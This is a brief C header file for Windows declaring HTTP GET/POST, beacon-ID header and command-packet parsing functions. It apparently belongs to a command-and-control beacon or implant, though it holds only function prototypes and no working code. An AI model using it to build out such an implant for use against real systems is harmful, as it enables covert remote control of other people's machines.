#pragma once
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <windows.h>

#define MAX_HEADER_SIZE 1024

unsigned char* parseGetResponse(unsigned char* data, size_t post_data_length, size_t* responsedatalen);
unsigned char* parsePacket(unsigned char* total_buffer, uint32_t* total_length, uint32_t* command_type, size_t* command_length , size_t* count);
unsigned char* GET(wchar_t* cookie_data, size_t* responseSize);
unsigned char* make_beacon_id_header();
unsigned char* make_post_data(unsigned char* post_buffer, size_t post_length, int callback);
BOOL POST(unsigned char* post_data, size_t post_data_length, wchar_t* beacon_id_wheader);